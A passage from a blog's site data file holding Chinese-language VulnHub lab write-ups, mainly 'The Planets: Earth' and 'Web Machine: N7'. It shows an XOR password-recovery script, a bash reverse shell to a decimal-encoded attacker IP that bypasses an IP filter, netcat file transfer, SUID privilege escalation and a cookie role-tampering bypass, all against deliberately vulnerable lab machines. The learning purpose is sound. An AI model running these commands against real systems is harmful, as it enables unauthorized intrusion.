class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">aa=binascii.hexlify(str_bin).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">bb=<span class=\"built_in\">hex</span>(<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>) ^ <span class=\"built_in\">int</span>(aa,<span class=\"number\">16</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>.fromhex(bb[<span class=\"number\">2</span>:]).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># 执行后得到earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用账号密码<code>terra/earthclimatechangebad4humans</code>登录，得到一个命令执行页面</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-11.png\" alt=\"11\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>在网页敲命令终究不太爽，还是要反弹shell。but过，在反弹shell的时候提示禁止远程连接，但是测试了一下发现连自己本机都不能连接，所以应该不是防火墙限制，只是过滤了IP而已，不过Linux有个很好的地方，就是可以用完整的十进制来表示IP，随便找个IP转十进制的网站转一转</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-12.png\" alt=\"12\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-13.png\" alt=\"13\"></p>\n<p>先在攻击机开一个监听端口等靶机反弹<code>nc -lvvp</code>，然后再使用命令执行漏洞执行<code>bash -i &gt;&amp; /dev/tcp/3232249967/8848 0&gt;&amp;1</code>命令反弹到本地，在earth_web目录下找到一个flag<code>user_flag.txt</code></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-14.png\" alt=\"14\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-15.png\" alt=\"15\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>在逛了一圈var路径下的文件后要么找不到有什么有用的信息，要么权限不够，考虑一下提权。先搜索一下系统内有suid权限的文件<code>find / -perm -04000 2&gt;/dev/null</code>。其中有个不寻常的文件<code>reset_root</code>，直接运行会报错，提示触发器不存在</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-16.png\" alt=\"16\"></p>\n<p>分析一下，先将文件传到kali上，现在kali机上执行<code>nc -lvnp 8888 &gt; reset_root</code>监听8888端口用于接收文件，然后在靶机上执行<code>nc -w 3 192.168.56.111 8888 &lt; /usr/bin/reset_root</code>将文件传到kali。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-17.png\" alt=\"17\"></p>\n<p>在kali上使用<code>strace</code>命令跟踪reset_root，<code>-f</code>和<code>-F</code>表示同时跟踪fork和vfork出来的进程，可以看到，它在输出完第一段话后开始尝试访问图中这三个文件，但是提示文件不存在</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-18.png\" alt=\"18\"></p>\n<p>所以我们可以在目标机器上尝试创建文件，刚好两个目录下也有写入权限，新建三个文件，然后再次尝试执行<code>reset_root</code>，没有报错并且提示root用户密码已经重置为Earth，使用<code>su</code>命令切换到root用户，可以正常登录，在root目录下找到第二个flag<code>root_flag.txt</code></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-19.png\" alt=\"19\"></p>\n","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"excerpt":"","more":"<h1 id=\"The-Planets-Earth\"><a href=\"#The-Planets-Earth\" class=\"headerlink\" title=\"The Planets: Earth\"></a>The Planets: Earth</h1><h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"http://www.vulnhub.com/entry/the-planets-earth,755/\">http://www.vulnhub.com/entry/the-planets-earth,755/</a></p>\n<p>难度：Easy</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机：Kali 192.168.56.111</p>\n<p>目标靶机：Fedora 192.168.56.110</p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p>打开目标靶机，使用<code>arp-scan -I eth1 -l</code>指定网卡并扫描局域网内存活机器IP，使用nmap扫描开启了什么端口，然后使用<code>-sV</code>参数查看开放端口的详细信息，这里扫描出目标开启了<code>22,80,443</code>端口。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-1.png\" alt=\"1\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-2.png\" alt=\"2\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-3.png\" alt=\"3\"></p>\n<p>访问网页，80和443端口都显示<code>400</code>访问错误，查看证书发现<code>earth.local</code>域名。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-4.png\" alt=\"4\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-5.png\" alt=\"5\"></p>\n<p>使用ssl-scan工具收集证书信息<code>sslscan --show-certificate -4 192.168.56.110</code>，扫描完后发现总共有<code>earth.local</code>和<code>terratest.earth.local</code>两个域名，将其加入<code>/etc/hosts</code>文件中</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-6.png\" alt=\"6\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-7.png\" alt=\"7\"></p>\n<p>再次访问显示连接正常，使用dirb工具遍历目录，我四个网址都扫描了一次，因为怕靶机配置虚拟主机，前三个扫描到有个admin后台登陆页面，尝试万能密码不行，而且源码中也没有隐藏信息提示。在扫描<code>https://terratest.earth.local/</code>的时候发现该网站下有<code>robots.txt</code>文件</p>\n<p>![8]<a href=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-8.png\">https://img.freeaes.com/images/2021/12/10/Planets-Earth-8.png</a></p>\n<p>访问发现其有一个特殊文件<code>testingnotes.*</code>，我一开始以为是个网页脚本语言文件，测试了好几种都不成功，后来发现是个txt文件（后来看别的大佬写的wp也可以写个py脚本，就不用一个一个手动测试了）。使用谷歌翻译了一下，大概意思就是说使用<code>XOR</code>（异或运算）算法加密传输的信息（也就是主页下的那些原始码）。<code>testdata.txt</code>是加密用的密钥（这个文件内容就是个介绍地球的文本，所以密钥应该就是它本身），<code>terra</code>是管理员账户（用于登录刚刚找到的admin登录页面）。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-9.png\" alt=\"9\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-10.png\" alt=\"10\"></p>\n<p>写个小脚本解密，先将密钥转化成hex，然后和密文进行xor运算，最后将得到的结果转为str得到原文，因为原文有很多重复的，只需要截取一段就行了<code>earthclimatechangebad4humans</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str_to_hexStr</span>(<span class=\"params\">string</span>):</span></span><br><span class=\"line\">    str_bin = string.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> binascii.hexlify(str_bin).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">data = <span class=\"string\">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">key=<span class=\"string\">&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">str_bin = key.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">aa=binascii.hexlify(str_bin).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">bb=<span class=\"built_in\">hex</span>(<span class=\"built_in\">int</span>(data,<span class=\"number\">16</span>) ^ <span class=\"built_in\">int</span>(aa,<span class=\"number\">16</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">bytes</span>.fromhex(bb[<span class=\"number\">2</span>:]).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># 执行后得到earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用账号密码<code>terra/earthclimatechangebad4humans</code>登录，得到一个命令执行页面</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-11.png\" alt=\"11\"></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>在网页敲命令终究不太爽，还是要反弹shell。but过，在反弹shell的时候提示禁止远程连接，但是测试了一下发现连自己本机都不能连接，所以应该不是防火墙限制，只是过滤了IP而已，不过Linux有个很好的地方，就是可以用完整的十进制来表示IP，随便找个IP转十进制的网站转一转</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-12.png\" alt=\"12\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-13.png\" alt=\"13\"></p>\n<p>先在攻击机开一个监听端口等靶机反弹<code>nc -lvvp</code>，然后再使用命令执行漏洞执行<code>bash -i &gt;&amp; /dev/tcp/3232249967/8848 0&gt;&amp;1</code>命令反弹到本地，在earth_web目录下找到一个flag<code>user_flag.txt</code></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-14.png\" alt=\"14\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-15.png\" alt=\"15\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><p>在逛了一圈var路径下的文件后要么找不到有什么有用的信息，要么权限不够，考虑一下提权。先搜索一下系统内有suid权限的文件<code>find / -perm -04000 2&gt;/dev/null</code>。其中有个不寻常的文件<code>reset_root</code>，直接运行会报错，提示触发器不存在</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-16.png\" alt=\"16\"></p>\n<p>分析一下，先将文件传到kali上，现在kali机上执行<code>nc -lvnp 8888 &gt; reset_root</code>监听8888端口用于接收文件，然后在靶机上执行<code>nc -w 3 192.168.56.111 8888 &lt; /usr/bin/reset_root</code>将文件传到kali。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-17.png\" alt=\"17\"></p>\n<p>在kali上使用<code>strace</code>命令跟踪reset_root，<code>-f</code>和<code>-F</code>表示同时跟踪fork和vfork出来的进程，可以看到，它在输出完第一段话后开始尝试访问图中这三个文件，但是提示文件不存在</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-18.png\" alt=\"18\"></p>\n<p>所以我们可以在目标机器上尝试创建文件，刚好两个目录下也有写入权限，新建三个文件，然后再次尝试执行<code>reset_root</code>，没有报错并且提示root用户密码已经重置为Earth，使用<code>su</code>命令切换到root用户，可以正常登录，在root目录下找到第二个flag<code>root_flag.txt</code></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/10/Planets-Earth-19.png\" alt=\"19\"></p>\n"},{"title":"VulnHub | Web-Machine-N7","date":"2021-12-12T16:10:04.000Z","cover":"https://img.freeaes.com/images/2021/09/05/7.jpg","_content":"\n# Web Machine : N7\n\n\n## 项目地址\n\n[https://www.vulnhub.com/entry/web-machine-n7,756/](https://www.vulnhub.com/entry/web-machine-n7,756/)\n\n难度：Medium\n\n## 测试环境\n\n攻击机：Kali 192.168.56.111\n\n目标靶机：Kali 192.168.56.112\n\n## 渗透过程\n\n打开目标靶机，使用`arp-scan -I eth1 -l`指定网卡并扫描局域网内存活机器IP，使用nmap扫描开启了什么端口，然后使用`-sV`参数查看开放端口的详细信息，这里扫描出目标只开启了80端口。\n\n![1](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-1.png)\n\n![2](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-2.png)\n\n打开目标网站，什么都没有，没有robots.txt，源码里也没信息，到处点点，唯一一个PHP`profile.php`文件也是空白的，用gobuster扫一下路径，一开始用dirb的啥都没扫出来，然后换了个字典尝试`gobuster dir -u http://192.168.56.112 -w 字典路径 -x html,php,txt,bak`\n\n![3](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-3.png)\n\n![4](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-4.png)\n\n有一个`exploit.html`，看上去是个上传页面，先随手丢个文件过去，会报错，传到了localhost。\n\n![5](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-5.png)\n\n![6](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-6.png)\n\n修改html源码，将localhost改成靶机域名，然后再上传一个文件，提交后就会跳转到profile.php页面，并且有个半残的Flag。\n\n![7](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-7.png)\n\n![8](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-7.png)\n\n做到这里已经没什么思路了，上网找了一下别人写的WP，只有一位大佬写的(![地址](http://www.caidexin.top/2021/11/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/Web-Machine-N7/))，他找到一个`enter_network`路径和账号密码，用这个路径扫一下目录，找到`admin.php`和`index.php`两个文件\n\n![9](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-9.png)\n\nindex.php是一个登录页面，admin.php需要登录，随便输入了个`123/123`啥反应都没有，也没有提示登陆失败，但是查看cookie的时候多了两个参数`role,user`（登陆前是没有cookie的）\n\n![10](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-10.png)\n\nrole使用url解码后是个base64加密，解密后看上去像md5，丢入网站查询一下是admin.\n\n![11](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-11.png)\n\n![12](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-12.png)\n\n访问admin.php，还是无法进入，显示只能admin访问，将cookie的role参数的值直接改成admin，然后就可以了:)，也是一个半残的Flag，不过应该是和前面获取到的那个一起的，结合起来就是个完整的Flag。\n\n![13](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-13.png)\n\n![14](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-14.png)\n\n\n## 后记\n做完之后我都不知道这个靶机是不是这么做，说实话，有点对不起它的Medium，要说做，后面那个路径我用了好多字典都爆不出来，也有可能是我菜，如果有大佬发现别的方法也可以说一下让我学习学习。\n","source":"_posts/2021-12-13.md","raw":"---\ntitle: VulnHub | Web-Machine-N7\ndate: 2021-12-13 00:10:04\ncover: https://img.freeaes.com/images/2021/09/05/7.jpg\ntags:\n- VulnHub\ncategories: 学习笔记\n---\n\n# Web Machine : N7\n\n\n## 项目地址\n\n[https://www.vulnhub.com/entry/web-machine-n7,756/](https://www.vulnhub.com/entry/web-machine-n7,756/)\n\n难度：Medium\n\n## 测试环境\n\n攻击机：Kali 192.168.56.111\n\n目标靶机：Kali 192.168.56.112\n\n## 渗透过程\n\n打开目标靶机，使用`arp-scan -I eth1 -l`指定网卡并扫描局域网内存活机器IP，使用nmap扫描开启了什么端口，然后使用`-sV`参数查看开放端口的详细信息，这里扫描出目标只开启了80端口。\n\n![1](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-1.png)\n\n![2](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-2.png)\n\n打开目标网站，什么都没有，没有robots.txt，源码里也没信息，到处点点，唯一一个PHP`profile.php`文件也是空白的，用gobuster扫一下路径，一开始用dirb的啥都没扫出来，然后换了个字典尝试`gobuster dir -u http://192.168.56.112 -w 字典路径 -x html,php,txt,bak`\n\n![3](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-3.png)\n\n![4](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-4.png)\n\n有一个`exploit.html`，看上去是个上传页面，先随手丢个文件过去，会报错，传到了localhost。\n\n![5](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-5.png)\n\n![6](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-6.png)\n\n修改html源码，将localhost改成靶机域名，然后再上传一个文件，提交后就会跳转到profile.php页面，并且有个半残的Flag。\n\n![7](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-7.png)\n\n![8](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-7.png)\n\n做到这里已经没什么思路了，上网找了一下别人写的WP，只有一位大佬写的(![地址](http://www.caidexin.top/2021/11/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/Web-Machine-N7/))，他找到一个`enter_network`路径和账号密码，用这个路径扫一下目录，找到`admin.php`和`index.php`两个文件\n\n![9](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-9.png)\n\nindex.php是一个登录页面，admin.php需要登录，随便输入了个`123/123`啥反应都没有，也没有提示登陆失败，但是查看cookie的时候多了两个参数`role,user`（登陆前是没有cookie的）\n\n![10](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-10.png)\n\nrole使用url解码后是个base64加密，解密后看上去像md5，丢入网站查询一下是admin.\n\n![11](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-11.png)\n\n![12](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-12.png)\n\n访问admin.php，还是无法进入，显示只能admin访问，将cookie的role参数的值直接改成admin，然后就可以了:)，也是一个半残的Flag，不过应该是和前面获取到的那个一起的，结合起来就是个完整的Flag。\n\n![13](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-13.png)\n\n![14](https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-14.png)\n\n\n## 后记\n做完之后我都不知道这个靶机是不是这么做，说实话，有点对不起它的Medium，要说做，后面那个路径我用了好多字典都爆不出来，也有可能是我菜，如果有大佬发现别的方法也可以说一下让我学习学习。\n","slug":"2021-12-13","published":1,"updated":"2022-01-13T08:04:37.544Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckydsviib000ruxf774da34dh","content":"<h1 id=\"Web-Machine-N7\"><a href=\"#Web-Machine-N7\" class=\"headerlink\" title=\"Web Machine : N7\"></a>Web Machine : N7</h1><h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"https://www.vulnhub.com/entry/web-machine-n7,756/\">https://www.vulnhub.com/entry/web-machine-n7,756/</a></p>\n<p>难度：Medium</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机：Kali 192.168.56.111</p>\n<p>目标靶机：Kali 192.168.56.112</p>\n<h2 id=\"渗透过程\"><a href=\"#渗透过程\" class=\"headerlink\" title=\"渗透过程\"></a>渗透过程</h2><p>打开目标靶机，使用<code>arp-scan -I eth1 -l</code>指定网卡并扫描局域网内存活机器IP，使用nmap扫描开启了什么端口，然后使用<code>-sV</code>参数查看开放端口的详细信息，这里扫描出目标只开启了80端口。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-1.png\" alt=\"1\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-2.png\" alt=\"2\"></p>\n<p>打开目标网站，什么都没有，没有robots.txt，源码里也没信息，到处点点，唯一一个PHP<code>profile.php</code>文件也是空白的，用gobuster扫一下路径，一开始用dirb的啥都没扫出来，然后换了个字典尝试<code>gobuster dir -u http://192.168.56.112 -w 字典路径 -x html,php,txt,bak</code></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-3.png\" alt=\"3\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-4.png\" alt=\"4\"></p>\n<p>有一个<code>exploit.html</code>，看上去是个上传页面，先随手丢个文件过去，会报错，传到了localhost。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-5.png\" alt=\"5\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-6.png\" alt=\"6\"></p>\n<p>修改html源码，将localhost改成靶机域名，然后再上传一个文件，提交后就会跳转到profile.php页面，并且有个半残的Flag。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-7.png\" alt=\"7\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-7.png\" alt=\"8\"></p>\n<p>做到这里已经没什么思路了，上网找了一下别人写的WP，只有一位大佬写的(<img src=\"http://www.caidexin.top/2021/11/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/Web-Machine-N7/\" alt=\"地址\">)，他找到一个<code>enter_network</code>路径和账号密码，用这个路径扫一下目录，找到<code>admin.php</code>和<code>index.php</code>两个文件</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-9.png\" alt=\"9\"></p>\n<p>index.php是一个登录页面，admin.php需要登录，随便输入了个<code>123/123</code>啥反应都没有，也没有提示登陆失败，但是查看cookie的时候多了两个参数<code>role,user</code>（登陆前是没有cookie的）</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-10.png\" alt=\"10\"></p>\n<p>role使用url解码后是个base64加密，解密后看上去像md5，丢入网站查询一下是admin.</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-11.png\" alt=\"11\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-12.png\" alt=\"12\"></p>\n<p>访问admin.php，还是无法进入，显示只能admin访问，将cookie的role参数的值直接改成admin，然后就可以了:)，也是一个半残的Flag，不过应该是和前面获取到的那个一起的，结合起来就是个完整的Flag。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-13.png\" alt=\"13\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-14.png\" alt=\"14\"></p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>做完之后我都不知道这个靶机是不是这么做，说实话，有点对不起它的Medium，要说做，后面那个路径我用了好多字典都爆不出来，也有可能是我菜，如果有大佬发现别的方法也可以说一下让我学习学习。</p>\n","site":{"data":{"link":[{"class_name":"友情链接","class_desc":"那些人，那些事","link_list":[{"name":"及时行乐","link":"https://jsxlo.com/","avatar":"https://www.jsxlo.com/wp-content/uploads/2018/09/%E5%A4%B4%E5%83%8F-300x300.jpeg","descr":"人的一生其实很短"}]}]}},"excerpt":"","more":"<h1 id=\"Web-Machine-N7\"><a href=\"#Web-Machine-N7\" class=\"headerlink\" title=\"Web Machine : N7\"></a>Web Machine : N7</h1><h2 id=\"项目地址\"><a href=\"#项目地址\" class=\"headerlink\" title=\"项目地址\"></a>项目地址</h2><p><a href=\"https://www.vulnhub.com/entry/web-machine-n7,756/\">https://www.vulnhub.com/entry/web-machine-n7,756/</a></p>\n<p>难度：Medium</p>\n<h2 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h2><p>攻击机：Kali 192.168.56.111</p>\n<p>目标靶机：Kali 192.168.56.112</p>\n<h2 id=\"渗透过程\"><a href=\"#渗透过程\" class=\"headerlink\" title=\"渗透过程\"></a>渗透过程</h2><p>打开目标靶机，使用<code>arp-scan -I eth1 -l</code>指定网卡并扫描局域网内存活机器IP，使用nmap扫描开启了什么端口，然后使用<code>-sV</code>参数查看开放端口的详细信息，这里扫描出目标只开启了80端口。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-1.png\" alt=\"1\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-2.png\" alt=\"2\"></p>\n<p>打开目标网站，什么都没有，没有robots.txt，源码里也没信息，到处点点，唯一一个PHP<code>profile.php</code>文件也是空白的，用gobuster扫一下路径，一开始用dirb的啥都没扫出来，然后换了个字典尝试<code>gobuster dir -u http://192.168.56.112 -w 字典路径 -x html,php,txt,bak</code></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-3.png\" alt=\"3\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-4.png\" alt=\"4\"></p>\n<p>有一个<code>exploit.html</code>，看上去是个上传页面，先随手丢个文件过去，会报错，传到了localhost。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-5.png\" alt=\"5\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-6.png\" alt=\"6\"></p>\n<p>修改html源码，将localhost改成靶机域名，然后再上传一个文件，提交后就会跳转到profile.php页面，并且有个半残的Flag。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-7.png\" alt=\"7\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-7.png\" alt=\"8\"></p>\n<p>做到这里已经没什么思路了，上网找了一下别人写的WP，只有一位大佬写的(<img src=\"http://www.caidexin.top/2021/11/13/blog_formal/security/%E9%9D%B6%E5%9C%BA/Web-Machine-N7/\" alt=\"地址\">)，他找到一个<code>enter_network</code>路径和账号密码，用这个路径扫一下目录，找到<code>admin.php</code>和<code>index.php</code>两个文件</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-9.png\" alt=\"9\"></p>\n<p>index.php是一个登录页面，admin.php需要登录，随便输入了个<code>123/123</code>啥反应都没有，也没有提示登陆失败，但是查看cookie的时候多了两个参数<code>role,user</code>（登陆前是没有cookie的）</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-10.png\" alt=\"10\"></p>\n<p>role使用url解码后是个base64加密，解密后看上去像md5，丢入网站查询一下是admin.</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-11.png\" alt=\"11\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-12.png\" alt=\"12\"></p>\n<p>访问admin.php，还是无法进入，显示只能admin访问，将cookie的role参数的值直接改成admin，然后就可以了:)，也是一个半残的Flag，不过应该是和前面获取到的那个一起的，结合起来就是个完整的Flag。</p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-13.png\" alt=\"13\"></p>\n<p><img src=\"https://img.freeaes.com/images/2021/12/13/Web-Machine_N7-14.png\" alt=\"14\"></p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>做完之后我都不知道这个靶机是不是这么做，说实话，有点对不起它的Medium，要说做，后面那个路径我用了好多字典都爆不出来，也有可能是我菜，如果有大佬发现别的方法也可以说一下让我学习学习。</p>\n"},{"title":"VulnHub | Red-1","date":"2021-12-19T12:38:02.000Z","cover":"https://img.freeaes.com/images/2021/09/05/8.jpg","_content":"\n# Red : 1\n\n## 项目地址\n[http://www.vulnhub.com/entry/red-1,753/](http://www.vulnhub.com/entry/red-1,753/)\n难度：Medium\n\n## 